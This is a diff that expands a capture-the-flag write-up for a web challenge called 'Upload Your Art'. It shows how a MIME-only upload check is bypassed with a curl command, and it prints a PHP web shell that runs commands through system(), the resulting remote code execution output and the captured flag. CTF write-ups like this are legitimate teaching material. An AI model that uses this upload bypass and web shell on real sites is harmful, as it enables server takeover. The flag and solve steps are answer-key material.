@@ -1,7 +1,7 @@
 ---
 title: "Upload Your Art"
 ctf: "Safaricom CTF"
-date: 2026-10-04
+date: 2026-10-06
 category: web
 difficulty: medium
 points: 300
@@ -11,13 +11,94 @@ author: "Strawhats"
 
 # Upload Your Art
 
-## Summary
+> **Category:** WEB · **Points:** 300 · **Difficulty:** medium
 
-- **Category:** web
+## Discovery, analysis & exploitation
 
-## Solution
+The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.
 
-### Step 1: Run the solve script:
+- **Target:** `http://54.72.82.22:8160`
+
+## Fingerprint
+
+```
+Server: Apache/2.4.68 (Debian)
+X-Powered-By: PHP/8.3.35
+```
+
+Themed page: **"OFF THE WALL"** street-art gallery — "Make your mark. Upload your
+work to the city's independent digital gallery." One multipart form, field
+`uploaded_file`.
+
+## The bug: MIME validation only
+
+The server inspects **only** the multipart part's `Content-Type`, and trusts the
+client for it:
+
+```
+upload art.php (default type)  -> ERROR: File type (MIME: application/octet-stream)
+                                  is not allowed! Only image/jpeg, image/png,
+                                  image/gif are accepted.
+upload art.txt                 -> ERROR: File type (MIME: text/plain) ...
+```
+
+There is **no extension check, no magic-byte check, and no re-encoding**. The
+`Content-Type` of a multipart part is attacker-controlled — it is just a header
+on the part.
+
+## Exploitation
+
+Keep the `.php` filename, flip the declared type:
+
+```bash
+curl -F 'uploaded_file=@art.php;filename=art.php;type=image/png' \
+     http://54.72.82.22:8160/
+```
+
+Result:
+
+```
+SUCCESS: Uploaded file URL: /uploads/art.php
+Your Art Is: safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
+```
+
+The file lands at `/uploads/art.php` and **executes** (the upload dir is not
+hardened against PHP):
+
+```php
+<?php echo "PWNED"; system($_GET["c"]); ?>
+```
+
+```bash
+$ curl 'http://54.72.82.22:8160/uploads/art.php?c=id'
+PWNEDuid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+RCE as `www-data`. Filesystem recon confirms a stock Debian container
+(`/.dockerenv`, PHP 8.3, `ls -la /`).
+
+## Notes
+
+- The intended "win" is simply a bypassed upload — the app treats the flag as
+  "your art" once it accepts the file.
+- The RCE is a bonus surface; there is no `disable_functions` restriction on
+  `system()`.
+- If a hardened variant blocked execution, the same bypass plus a `.htaccess`
+  upload or a `.phtml`/`.php5`/`.phar` extension would be the next step — none
+  was needed here.
+
+## Exploit
+
+```bash
+echo '<?php system($_GET["c"]); ?>' > art.php
+curl -F 'uploaded_file=@art.php;filename=art.php;type=image/png' http://54.72.82.22:8160/
+```
+
+See `solve.py`.
+
+## Solve script
+
+`web/upload-your-art/solve.py`:
 
 ```python
 #!/usr/bin/env python3
@@ -78,8 +159,24 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 ```
+
+## Tools
+
+**Used in this solve:**
+
+- Python 3 (solver)
+- curl
+
+**Other tools that fit this category:**
+
+- Burp Suite / mitmproxy (intercept + repeat)
+- ffuf / feroxbuster (content & parameter discovery)
+- sqlmap (automated SQLi)
+- tplmap (SSTI)
+- jwt_tool (JWT attacks)
+- nikto
+- nuclei
 
 ## Flag
 
